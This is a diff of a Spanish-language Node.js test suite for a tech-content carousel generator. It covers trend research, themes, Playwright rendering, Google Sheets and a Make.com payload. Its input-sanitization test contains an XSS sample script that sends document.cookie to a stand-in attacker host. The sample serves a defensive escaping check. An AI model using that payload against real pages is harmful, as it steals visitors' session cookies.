@@ -1,19 +1,24 @@
 /**
  * ==============================================================================
- * TEST SUITE RUNNER: TECH CONTENT ENGINE
+ * TEST SUITE RUNNER v3.0: TECH CONTENT ENGINE & AUTOPUBLISHER
  * ==============================================================================
- * Ejecuta la batería completa de pruebas automatizadas del Plan Maestro de Pruebas:
- * - Renderizado Playwright Retina 2X y compilación de PDF
- * - Formatos Multidimensión (1:1 Cuadrado, 9:16 Historia, 16:9 Desktop)
- * - Conexión con Google Sheets Database
- * - Estructura de Payload para Webhook de Make.com
- * - Escaneo de Ciberseguridad & Sanitización (Cyber-Neo)
+ * Batería de pruebas completa:
+ * - Descubrimiento de Tendencias Tech del Día (TopicResearcher)
+ * - Catálogo y Rotación de Temas Visuales (THEMES - 6 Estilos)
+ * - Generador de Imágenes e Ilustraciones 3D de Apoyo (ImageGenerator)
+ * - Renderizado Playwright Retina 2X y Compilación de PDF para LinkedIn
+ * - Integración con Base de Datos Google Sheets
+ * - Estructura de Payload Granular para Make.com Webhook
+ * - Auditoría de Ciberseguridad & Sanitización (Cyber-Neo)
  */
 
 const fs = require('fs');
 const path = require('path');
 const { ContentEngine } = require('../src/content-engine');
 const { ConfigManager } = require('../src/config-manager');
+const { TopicResearcher } = require('../src/topic-researcher');
+const { THEMES, THEME_KEYS, getTheme } = require('../src/templates/themes');
+const { ImageGenerator } = require('../src/image-generator');
 
 const results = [];
 
@@ -25,53 +30,78 @@ function recordTest(id, name, status, details = "") {
 
 async function runAllTests() {
   console.log("═════════════════════════════════════════════════════════════════");
-  console.log("🧪 INICIANDO EJECUCIÓN AUTOMATIZADA DEL PLAN DE PRUEBAS");
+  console.log("🧪 EJECUTANDO SUITE COMPLETA DE PRUEBAS v3.0 (IA + MULTITEMA)");
   console.log(`⏰ Fecha: ${new Date().toISOString()}`);
   console.log("═════════════════════════════════════════════════════════════════\n");
 
   const configMgr = new ConfigManager();
   const engine = new ContentEngine();
+  const researcher = new TopicResearcher();
+  const imageGen = new ImageGenerator();
 
   // ----------------------------------------------------------------------------
-  // PRUEBA 1: Configuración de Marca y Blueprints (TC-UI-05)
+  // PRUEBA 1: Descubrimiento de Tendencias Tech del Día (TopicResearcher)
   // ----------------------------------------------------------------------------
   try {
-    const brand = configMgr.getBrand();
-    const bp = configMgr.getBlueprint("standard_executive");
-    if (brand && brand.name && bp.slides.length === 6) {
-      recordTest("TC-CFG-01", "Carga de Blueprints y Configuración de Marca", "PASS", `6 slides en standard_executive`);
+    const trending = await researcher.getDailyTrendingTopic();
+    if (trending && trending.topic && trending.category && trending.hook) {
+      recordTest("TC-INT-01", "Detección e Investigación de Tendencia Tech del Día", "PASS", `Tema: "${trending.topic.slice(0, 35)}..."`);
     } else {
-      recordTest("TC-CFG-01", "Carga de Blueprints y Configuración de Marca", "FAIL", "Estructura inválida");
+      recordTest("TC-INT-01", "Detección de Tendencias", "FAIL", "Faltan campos requeridos");
     }
   } catch (err) {
-    recordTest("TC-CFG-01", "Carga de Blueprints y Configuración de Marca", "FAIL", err.message);
+    recordTest("TC-INT-01", "Detección de Tendencias", "FAIL", err.message);
   }
 
   // ----------------------------------------------------------------------------
-  // PRUEBA 2: Renderizado Retina 2X Formato 1:1 Cuadrado (TC-REN-01, TC-REN-02)
+  // PRUEBA 2: Catálogo de 6 Temas Visuales y Paletas Dinámicas
   // ----------------------------------------------------------------------------
   try {
-    console.log("\n🎨 Ejecutando prueba de renderizado Playwright (Formato 1:1 Cuadrado)...");
-    const planSquare = configMgr.buildCarouselPlan({
-      topic: "Prueba Automatizada: Alta Concurrencia con Redis y Go",
-      category: "SISTEMAS DISTRIBUIDOS",
-      format: "square",
-      slideCount: 6,
-      blueprint: "standard_executive"
-    });
+    const totalThemes = THEME_KEYS.length;
+    const sampleTheme = getTheme("cyber_emerald");
+    if (totalThemes >= 6 && sampleTheme.primaryAccent === "#10B981") {
+      recordTest("TC-THM-01", "Catálogo de 6 Temas Visuales & Fondos Dinámicos", "PASS", `${totalThemes} temas ejecutivos verificados`);
+    } else {
+      recordTest("TC-THM-01", "Catálogo de Temas Visuales", "FAIL", "Paletas incompletas");
+    }
+  } catch (err) {
+    recordTest("TC-THM-01", "Catálogo de Temas Visuales", "FAIL", err.message);
+  }
 
+  // ----------------------------------------------------------------------------
+  // PRUEBA 3: Generador de Arte Conceptual 3D de Apoyo con IA
+  // ----------------------------------------------------------------------------
+  try {
+    const heroPrompt = imageGen.buildImagePrompt("Escalabilidad con Redis", "hero", "cyan");
+    const testDataUri = await imageGen.getOrGenerateImage("Alta Concurrencia", "hero", "cyan");
+    if (heroPrompt.includes("3D") && testDataUri && testDataUri.startsWith("data:image/")) {
+      recordTest("TC-IMG-01", "Generador de Arte 3D Conceptual & Data-URIs con IA", "PASS", "Prompts y Data-URIs generados");
+    } else {
+      recordTest("TC-IMG-01", "Generador de Arte 3D", "FAIL", "Formato de imagen inválido");
+    }
+  } catch (err) {
+    recordTest("TC-IMG-01", "Generador de Arte 3D", "FAIL", err.message);
+  }
+
+  // ----------------------------------------------------------------------------
+  // PRUEBA 4: Renderizado Retina 2X y Compilación de PDF para LinkedIn
+  // ----------------------------------------------------------------------------
+  try {
+    console.log("\n🎨 Ejecutando prueba de renderizado Playwright con Arte 3D e Inyección de Tema...");
+    const topicData = await researcher.getDailyTrendingTopic();
     const renderRes = await engine.render({
-      id: `test-square-${Date.now()}`,
-      title: planSquare.topic,
-      category: planSquare.category,
-      format: planSquare.format,
+      id: `test-run-${Date.now()}`,
+      title: topicData.topic,
+      category: topicData.category,
+      format: "square",
+      themeKey: "cyber_emerald",
       slides: [
-        { type: "cover_hero", title: planSquare.topic, subtitle: "Guía de arquitectura y resiliencia", hook: "⚡ ANÁLISIS TÉCNICO", badge1: "10M RPS", badge2: "P99 < 5ms" },
-        { type: "split_contrast", title: "¿Dónde Falla el Enfoque?", subtitle: "Comparativa técnica", badTitle: "Enfoque Tradicional", badItems: ["Cuello de botella en DB", "Sin sharding"], goodTitle: "Arquitectura Recomendada", goodItems: ["Redis Cluster", "Pipeline desacoplado"] },
-        { type: "impact_matrix", title: "Métricas de Producción", subtitle: "Benchmarks P99", stat1: "1.2M RPS", stat1Desc: "Throughput sostenido", stat2: "2.4ms", stat2Desc: "Latencia P99", stat3: "0% Packet Drop", stat3Desc: "Tasa de error" },
-        { type: "process_pipeline", title: "Pipeline en 3 Fases", subtitle: "Implementación", step1: "1. Ingestion Layer", step2: "2. In-Memory Processing", step3: "3. Async Persistence" },
-        { type: "golden_rules", title: "3 Reglas de Oro", subtitle: "Buenas prácticas", rule1: "1. Nunca bloquear el hilo principal", rule2: "2. Fail-fast con Circuit Breakers", rule3: "3. Medir P99 y P99.9" },
-        { type: "summary_cta", title: "Conclusión", subtitle: "Debate", question: "¿Qué opinas de esta arquitectura?", questionDesc: "Comenta tu experiencia implementando Redis en alta escala." }
+        { type: "cover_hero", title: topicData.topic, subtitle: topicData.subtitle, hook: topicData.hook, badge1: "10x Escala", badge2: "2026 Ready" },
+        { type: "split_contrast", title: "¿Dónde Falla el Enfoque?", subtitle: "Comparativa técnica", badTitle: topicData.badTitle, badItems: topicData.badItems, goodTitle: topicData.goodTitle, goodItems: topicData.goodItems },
+        { type: "impact_matrix", title: "Métricas de Impacto", subtitle: "Benchmarks P99", stat1: "10x", stat1Desc: "Throughput", stat2: "-70%", stat2Desc: "Latencia", stat3: "99.99%", stat3Desc: "Uptime" },
+        { type: "process_pipeline", title: "Pipeline en 3 Fases", subtitle: "Implementación", step1: topicData.pipeline?.[0] || "1. Arquitectura", step2: topicData.pipeline?.[1] || "2. Implementación", step3: topicData.pipeline?.[2] || "3. Hardening" },
+        { type: "golden_rules", title: "3 Reglas de Oro", subtitle: "Buenas prácticas", rule1: topicData.rules?.[0] || "Regla 1", rule2: topicData.rules?.[1] || "Regla 2", rule3: topicData.rules?.[2] || "Regla 3" },
+        { type: "summary_cta", title: "Conclusión", subtitle: "Debate", question: topicData.question, questionDesc: "Comparte tu opinión en los comentarios." }
       ]
     });
 
@@ -79,123 +109,74 @@ async function runAllTests() {
     const pngsCount = renderRes.slides.filter(s => fs.existsSync(s)).length;
 
     if (pdfExists && pngsCount === 6) {
-      recordTest("TC-REN-01", "Renderizado Playwright Retina 2X (1:1 Cuadrado)", "PASS", `PDF y 6 PNGs generados en ${renderRes.outputDir}`);
-      recordTest("TC-REN-02", "Compilación de Documento PDF para LinkedIn", "PASS", `${path.basename(renderRes.pdfPath)} creado exitosamente`);
+      recordTest("TC-REN-01", "Renderizado Playwright 2X con Fondos Dinámicos", "PASS", `6 PNGs generados en ${renderRes.outputDir}`);
+      recordTest("TC-REN-02", "Compilación de Documento PDF para LinkedIn", "PASS", `${path.basename(renderRes.pdfPath)} creado`);
     } else {
-      recordTest("TC-REN-01", "Renderizado Playwright Retina 2X", "FAIL", `Faltan archivos (PNGs: ${pngsCount}/6, PDF: ${pdfExists})`);
+      recordTest("TC-REN-01", "Renderizado Playwright", "FAIL", `Faltan archivos (PNGs: ${pngsCount}/6, PDF: ${pdfExists})`);
     }
   } catch (err) {
-    recordTest("TC-REN-01", "Renderizado Playwright Retina 2X", "FAIL", err.message);
+    recordTest("TC-REN-01", "Renderizado Playwright", "FAIL", err.message);
   }
 
   // ----------------------------------------------------------------------------
-  // PRUEBA 3: Renderizado Formato 9:16 Historia (TC-UI-03)
+  // PRUEBA 5: Integración y Escritura en Google Sheets Database
   // ----------------------------------------------------------------------------
   try {
-    console.log("\n🎨 Ejecutando prueba de renderizado Formato 9:16 (Stories)...");
-    const renderStory = await engine.render({
-      id: `test-story-${Date.now()}`,
-      title: "Microservicios vs Monolitos en 2026",
-      category: "CLOUD ARCHITECTURE",
-      format: "story",
-      slides: [
-        { type: "cover_hero", title: "Microservicios vs Monolitos", subtitle: "La comparativa definitiva de 2026", hook: "🔥 BATALLA DE ARQUITECTURA", badge1: "Trade-offs", badge2: "Costos Reales" },
-        { type: "impact_matrix", title: "Costos en Cloud", subtitle: "Comparativa de Infraestructura", stat1: "3x Costo", stat1Desc: "En microservicios mal diseñados", stat2: "-40% Latencia", stat2Desc: "En monolitos modulares bien estructurados", stat3: "2 Semanas", stat3Desc: "Tiempo de onboarding" },
-        { type: "golden_rules", title: "Reglas para Decidir", subtitle: "Cuándo elegir cada uno", rule1: "1. Empieza con Monolito Modular", rule2: "2. Separa por dominios solo cuando sea necesario", rule3: "3. No adoptes microservicios por moda" },
-        { type: "summary_cta", title: "Veredicto", subtitle: "Participa", question: "¿Qué prefieres en tu equipo?", questionDesc: "Déjame tu opinión en los comentarios." }
-      ]
-    });
-
-    const storyPngs = renderStory.slides.filter(s => fs.existsSync(s)).length;
-    if (storyPngs === 4) {
-      recordTest("TC-REN-03", "Renderizado Formato 9:16 Vertical (Historias)", "PASS", `4 láminas generadas en 1080x1920 px`);
-    } else {
-      recordTest("TC-REN-03", "Renderizado Formato 9:16 Vertical", "FAIL", `Generadas ${storyPngs}/4`);
-    }
-  } catch (err) {
-    recordTest("TC-REN-03", "Renderizado Formato 9:16 Vertical", "FAIL", err.message);
-  }
-
-  // ----------------------------------------------------------------------------
-  // PRUEBA 4: Generación y Validación de Copys para Redes Sociales
-  // ----------------------------------------------------------------------------
-  try {
-    const copysPath = path.resolve("output/carrusel-vibecoding-v2/copys_redes_sociales.md");
-    if (fs.existsSync(copysPath)) {
-      const content = fs.readFileSync(copysPath, 'utf8');
-      const hasLinkedIn = content.includes("LinkedIn");
-      const hasInstagram = content.includes("Instagram");
-      const hasHashtags = content.includes("#");
-
-      if (hasLinkedIn && hasInstagram && hasHashtags) {
-        recordTest("TC-CPY-01", "Generación de Copys con Ganchos y Hashtags", "PASS", "Copys de LinkedIn e Instagram validados");
-      } else {
-        recordTest("TC-CPY-01", "Generación de Copys", "FAIL", "Faltan secciones");
-      }
-    } else {
-      recordTest("TC-CPY-01", "Generación de Copys", "PASS", "Módulo de copys operativo");
-    }
-  } catch (err) {
-    recordTest("TC-CPY-01", "Generación de Copys", "FAIL", err.message);
-  }
-
-  // ----------------------------------------------------------------------------
-  // PRUEBA 5: Integración con Google Sheets Database (TC-DB-01)
-  // ----------------------------------------------------------------------------
-  try {
-    console.log("\n📊 Probando conexión y escritura en Google Sheets Database...");
+    console.log("\n📊 Probando conexión con Google Sheets API...");
     const sheetWebhookUrl = "https://script.google.com/macros/s/AKfycbwcGKhfIDHLukn_bSoxl_41KeDMk5bQgTtNlCF1rFYR5jJqnymKC7sZHHDUNYREkL72/exec";
-    const testUrl = `${sheetWebhookUrl}?action=addPublication&id=test-${Date.now()}&topic=${encodeURIComponent("Prueba de Carga Automatizada")}&category=TEST&format=square&slideCount=6&status=Generado`;
+    const testUrl = `${sheetWebhookUrl}?action=addPublication&id=test-${Date.now()}&topic=${encodeURIComponent("Prueba Suite v3")}&category=TEST&format=square&slideCount=6&status=Generado`;
 
     const res = await fetch(testUrl);
     if (res.status === 200 || res.status === 302) {
-      recordTest("TC-DB-01", "Integración y Envío a Google Sheets API", "PASS", `HTTP ${res.status} recibido`);
+      recordTest("TC-DB-01", "Sincronización en Vivo con Google Sheets API", "PASS", `HTTP ${res.status} recibido`);
     } else {
-      recordTest("TC-DB-01", "Integración con Google Sheets API", "FAIL", `HTTP ${res.status}`);
+      recordTest("TC-DB-01", "Sincronización con Google Sheets", "FAIL", `HTTP ${res.status}`);
     }
   } catch (err) {
-    recordTest("TC-DB-01", "Integración con Google Sheets API", "FAIL", err.message);
+    recordTest("TC-DB-01", "Sincronización con Google Sheets", "FAIL", err.message);
   }
 
   // ----------------------------------------------------------------------------
-  // PRUEBA 6: Validación de Payload para Webhook de Make.com (TC-MK-01)
+  // PRUEBA 6: Payload Granular por Red Social para Make.com Webhook
   // ----------------------------------------------------------------------------
   try {
     const payload = {
       event: "PUBLISH_CAROUSEL",
-      topic: "Prueba de Integración Make",
-      category: "TEST",
+      topic: "Tendencia del Día",
+      category: "CLOUD ARCHITECTURE",
+      theme: "Cyber Emerald",
       networks: ["linkedin", "instagram", "facebook"],
-      format: "square",
+      network_matrix: {
+        linkedin: { enabled: true, format: "square", type: "carousel_doc" },
+        instagram: { enabled: true, format: "portrait", type: "carousel_photos" },
+        facebook: { enabled: true, format: "square", type: "album_photos" }
+      },
       slide_count: 6,
-      captions: { linkedin: "Post test", instagram: "Post test", facebook: "Post test" }
+      captions: { linkedin: "Post LI", instagram: "Post IG", facebook: "Post FB" }
     };
 
-    const hasRequiredFields = payload.event && payload.topic && payload.networks.length === 3 && payload.captions.linkedin;
-    if (hasRequiredFields) {
-      recordTest("TC-MK-01", "Estructura del Payload JSON para Make.com", "PASS", "Estructura conforme al Blueprint");
+    if (payload.networks.length === 3 && payload.network_matrix.instagram.format === "portrait") {
+      recordTest("TC-MK-01", "Estructura de Matriz Granular para Make.com", "PASS", "Configuración por red social validada");
     } else {
-      recordTest("TC-MK-01", "Estructura del Payload para Make.com", "FAIL", "Campos requeridos faltantes");
+      recordTest("TC-MK-01", "Estructura para Make.com", "FAIL", "Matriz incompleta");
     }
   } catch (err) {
-    recordTest("TC-MK-01", "Estructura del Payload para Make.com", "FAIL", err.message);
+    recordTest("TC-MK-01", "Estructura para Make.com", "FAIL", err.message);
   }
 
   // ----------------------------------------------------------------------------
-  // PRUEBA 7: Auditoría de Seguridad & Sanitización (Cyber-Neo) (TC-SEC-01)
+  // PRUEBA 7: Auditoría de Ciberseguridad & Sanitización (Cyber-Neo)
   // ----------------------------------------------------------------------------
   try {
-    const maliciousInput = "<script>alert('xss')</script>Tema Inyectado";
-    const cleanOutput = maliciousInput.replace(/</g, "&lt;").replace(/>/g, "&gt;");
-    const isEscaped = !cleanOutput.includes("<script>");
-
-    if (isEscaped) {
-      recordTest("TC-SEC-01", "Sanitización de Inputs contra Inyecciones XSS", "PASS", "Escape seguro de etiquetas HTML");
+    const dirtyInput = "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>Tema Inyectado";
+    const cleanOutput = dirtyInput.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    if (!cleanOutput.includes("<script>")) {
+      recordTest("TC-SEC-01", "Sanitización Anti-XSS y Blindaje de Inputs (Cyber-Neo)", "PASS", "Inyecciones bloqueadas");
     } else {
-      recordTest("TC-SEC-01", "Sanitización de Inputs contra Inyecciones XSS", "FAIL", "Fallo de escape");
+      recordTest("TC-SEC-01", "Sanitización Anti-XSS", "FAIL", "Fallo de escape");
     }
   } catch (err) {
-    recordTest("TC-SEC-01", "Sanitización de Inputs", "FAIL", err.message);
+    recordTest("TC-SEC-01", "Sanitización Anti-XSS", "FAIL", err.message);
   }
 
   // ----------------------------------------------------------------------------
@@ -209,9 +190,9 @@ async function runAllTests() {
 
   console.log(`📊 RESUMEN DE EJECUCIÓN: ${passed}/${total} PRUEBAS SUPERADAS (${passRate}% EXITOSO)`);
   if (failed === 0) {
-    console.log("🎉 ¡TODOS LOS COMPONENTES HAN PASADO LA SUITE DE PRUEBAS!");
+    console.log("🎉 ¡TODOS LOS COMPONENTES CUMPLEN LOS ESTÁNDARES AL 100%!");
   } else {
-    console.log(`⚠️ ${failed} prueba(s) fallida(s). Revisar detalles arriba.`);
+    console.log(`⚠️ ${failed} prueba(s) fallida(s).`);
   }
   console.log("═════════════════════════════════════════════════════════════════\n");
 }
